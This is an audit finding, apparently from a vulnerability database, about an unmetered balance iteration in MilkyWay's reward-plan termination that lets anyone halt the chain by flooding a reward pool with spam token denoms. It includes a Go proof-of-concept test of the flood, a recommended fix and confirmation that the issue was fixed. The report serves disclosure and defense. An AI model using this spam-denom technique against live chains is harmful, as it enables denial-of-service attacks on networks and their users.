---
tags:
  - lang/solidity
  - platform/cantina
  - has/poc
  - severity/high
  - sector/bridge
  - sector/staking-pool
protocol: "[[MilkyWay]]"
auditors:
  - "[[alpo]]"
report: "https://cdn.cantina.xyz/reports/report_cantina_solo_milkyway_january2025.pdf"
genome:
  - "[[unbounded-loop]]"
  - "[[permanent]]"
  - "[[reward-accounting]]"
---
# Unmetered balance iteration in reward termination can be exploited to permissionlessly halt the chain on demand 

- id: 46091
- impact: HIGH
- protocol: [[MilkyWay]]
- reporter: alpo (Cantina)
- source: https://cdn.cantina.xyz/reports/report_cantina_solo_milkyway_january2025.pdf

## Summary


This bug report discusses a vulnerability in the reward termination logic of a software code. The bug allows an attacker to halt the chain by depositing spam tokens into the reward pool address. A proof of concept test is provided and the recommended solution is to require a list of reward denoms in each reward plan or add a scaling gas cost. The issue has been fixed in a pull request.

## Details

## Reward Termination Logic Security Vulnerability

## Context
`rewards_plan.go#L127-L151`

## Description
The reward termination logic, which runs in `BeginBlock` and is therefore unmetered, makes a `GetAllBalances` call to the reward pool address. An attacker can cheaply and discreetly deposit an arbitrary number of spam tokens into this wallet to permissionlessly trigger a chain halt on demand.

## Proof of Concept
Below is a Go test that demonstrates an example chain halt that would execute for near-free by spreading deposits across multiple blocks. These transfers can be condensed into a single `SendCoins` transaction that halts the chain in the block that immediately follows.

```go
func (suite *KeeperTestSuite) TestTerminateEndedRewardsPlan_TokenFlood() {
    // Modify these values to simulate different scenarios
    numTokens := 10000
    tokensPerBlock := 500
    // Cache the context to avoid conflicts
    ctx, _ := suite.ctx.CacheContext()
    // Set up a sample service
    service, _ := suite.setupSampleServiceAndOperator(ctx)
    // Create a rewards plan that will be terminated
    planStartTime := ctx.BlockTime()
    planEndTime := planStartTime.Add(24 * time.Hour)
    amountPerDay := sdk.NewCoins(sdk.NewInt64Coin("umilk", 1_000_000_000))
    plan := suite.CreateBasicRewardsPlan(
        ctx,
        service.ID,
        amountPerDay,
        planStartTime,
        planEndTime,
        amountPerDay,
    )
    // Get the plan rewards pool address
    planRewardsPoolAddr := plan.MustGetRewardsPoolAddress(suite.accountKeeper.AddressCodec())
    // Simulate an attacker sending tokens across multiple blocks
    attackerAddr := testutil.TestAddress(9999)
    for i := 0; i < numTokens; i += tokensPerBlock {
        blockCoins := sdk.NewCoins()
        end := i + tokensPerBlock
        if end > numTokens {
            end = numTokens
        }
        // Create coins for this block's transfers
        for j := i; j < end; j++ {
            denom := fmt.Sprintf("ibc/%d", j)
            coin := sdk.NewInt64Coin(denom, 1)
            blockCoins = blockCoins.Add(coin)
        }
        // Fund the attacker's account for this block's transfers
        suite.FundAccount(ctx, attackerAddr.String(), blockCoins)
        // Attacker sends the coins to the plan rewards pool address
        err := suite.bankKeeper.SendCoins(
            ctx,
            sdk.MustAccAddressFromBech32(attackerAddr.String()),
            planRewardsPoolAddr,
            blockCoins,
        )
        suite.Require().NoError(err)
        fmt.Println("Deposited", len(blockCoins), "tokens at block", ctx.BlockHeight())
        // Advance block
        ctx = ctx.WithBlockHeight(ctx.BlockHeight() + 1)
    }
    // Set block time after plan end time to trigger termination
    ctx = ctx.WithBlockTime(planEndTime.Add(1 * time.Hour))
    startTime := time.Now()
    // --- Trigger BeginBlock chain halt 
---
    // Track how long TerminateEndedRewardsPlan takes
    // Note: the duration of this halt depends directly on the number of denoms deposited
    fmt.Println("Commencing BeginBlock call to `TerminateEndedRewardsPlan`...")
    err := suite.keeper.TerminateEndedRewardsPlans(ctx)
    suite.Require().NoError(err)
    // --- End of chain halt 
---
    duration := time.Since(startTime)
    fmt.Println("Halted chain for", duration, "with", numTokens, "different token denoms")
}
```

## Recommendation
There are several ways to patch this issue. The safest approach would be to require a list of reward denoms in each reward plan (or, if it’s not a requirement to support multiple denoms, simply require one). If this is infeasible due to refactor complexity, then adding a scaling gas cost to the number of reward denoms in each reward plan would be an acceptable alternative.

## MilkyWay
Fixed in PR 11.

## Alpo
Fix verified.
